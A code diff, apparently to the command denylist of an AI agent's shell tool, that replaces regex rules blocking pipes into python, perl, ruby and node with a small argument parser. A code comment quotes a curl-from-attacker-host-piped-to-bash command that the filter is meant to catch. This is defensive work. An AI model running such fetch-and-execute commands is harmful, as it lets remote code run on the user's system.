@@ -138,18 +138,6 @@ deny_groups = [
             # match — previously `$(curl attacker.com | bash)` slipped through
             # because `bash)` didn't satisfy the old `(?:\s|$)` anchor.
             r"\|\s*(bash|sh|/bin/bash|/bin/sh)(?=[\s)};]|$)",
-            # Pipe to a script interpreter that reads its *program* from the
-            # pipe (`curl … | python3`): no inline program or script file, only
-            # flags. `… | python3 -c '…'`, `| python3 -m json.tool` or
-            # `| node -e '…'` take the program from the command line and the
-            # pipe as data, so they are allowed.
-            (
-                r"\|\s*(?:python[\d.]*|perl|ruby|node)"
-                r"(?:\s+-[XW]\s+\S+|\s+-(?!-?(?:c|m|e|E|p|eval|print)\b)[\w=-]+)*"
-                r"\s*(?=[)};|&\n]|$)"
-            ),
-            # ...or that is told to explicitly: `| python3 - arg`
-            r"\|\s*(?:python[\d.]*|perl|ruby|node)(?:\s+-[\w=-]+)*\s+-(?=[\s)};|&]|$)",
         ],
         "Piping to shell interpreters or script execution is blocked. This pattern can execute arbitrary code and is a security risk.",
     ),
@@ -757,6 +745,78 @@ def format_denylist_denial(
     return format_denial(f"{label}: `{matched_cmd}`\n\n{reason}")
 
 
+# A pipe into a script interpreter: whether it runs the piped text depends on
+# its arguments, which _interpreter_gets_program() parses.
+_INTERPRETER_PIPE_RE = re.compile(
+    r"\|\s*(?P<interp>(?:[^\s|;&()]*/)?(?:python[\d.]*|perl|ruby|node))"
+    r"(?=[\s)};|&]|$)"
+)
+_PIPE_REASON = (
+    "Piping to shell interpreters or script execution is blocked. This pattern "
+    "can execute arbitrary code and is a security risk."
+)
+# flags that give the program inline, per interpreter (single-dash ones also
+# count inside a cluster, e.g. python -uc, perl -lne)
+_INLINE_PROGRAM_FLAGS = {
+    "python": {"c", "m"},
+    "perl": {"e", "E"},
+    "ruby": {"e"},
+    "node": {"e", "p"},
+}
+_INLINE_PROGRAM_LONG = {"node": {"--eval", "--print"}}
+# options whose value is the next argument, so it isn't taken for a script
+_VALUE_OPTIONS = {
+    "python": {"-X", "-W", "-Q"},
+    "perl": {"-I", "-M", "-m"},
+    "ruby": {"-I", "-r", "-E", "-C"},
+    "node": {"-r", "--require", "--import", "--input-type", "--loader", "-C"},
+}
+
+
+def _interpreter_gets_program(interp: str, rest: str) -> bool:
+    """Whether a piped-into interpreter gets its program from its arguments
+    (``-c``/``-e``/a script file) rather than reading it from the pipe."""
+    family = re.sub(r"[\d.]+$", "", interp.rsplit("/", 1)[-1])
+    rest = rest.split("\n", 1)[0]
+    try:
+        lexer = shlex.shlex(rest, posix=True, punctuation_chars=True)
+        lexer.whitespace_split = True
+        tokens = list(lexer)
+    except ValueError:
+        return False  # can't tell: treat as reading the pipe
+    args = []
+    for token in tokens:
+        if token in {"|", "||", "&", "&&", ";", ";;", "(", ")"}:
+            break
+        args.append(token)
+    skip = False
+    for i, arg in enumerate(args):
+        if skip:
+            skip = False
+            continue
+        if arg == "-":
+            return False  # explicitly reads the program from stdin
+        if arg == "--":
+            return i + 1 < len(args)  # the next argument is the script
+        if arg.startswith("--"):
+            if arg.split("=", 1)[0] in _INLINE_PROGRAM_LONG.get(family, set()):
+                return True
+            skip = arg in _VALUE_OPTIONS.get(family, set())
+            continue
+        if arg.startswith("-"):
+            if arg in _VALUE_OPTIONS.get(family, set()):
+                skip = True
+                continue
+            cluster = arg[1:]
+            if family == "node":
+                cluster = cluster[:1]  # node has no flag clusters
+            if set(cluster) & _INLINE_PROGRAM_FLAGS.get(family, set()):
+                return True
+            continue
+        return True  # a script file
+    return False
+
+
 def is_denylisted(cmd: str) -> tuple[bool, str | None, str | None]:
     """Check if a command contains dangerous patterns that should be denied.
 
@@ -791,6 +851,12 @@ def is_denylisted(cmd: str) -> tuple[bool, str | None, str | None]:
                 ):
                     continue
                 return True, reason, match.group(0)
+
+    for match in _INTERPRETER_PIPE_RE.finditer(cmd):
+        if _is_in_quoted_region(match.start(), safe_regions):
+            continue
+        if not _interpreter_gets_program(match.group("interp"), cmd[match.end() :]):
+            return True, _PIPE_REASON, match.group(0)
 
     return False, None, None
 
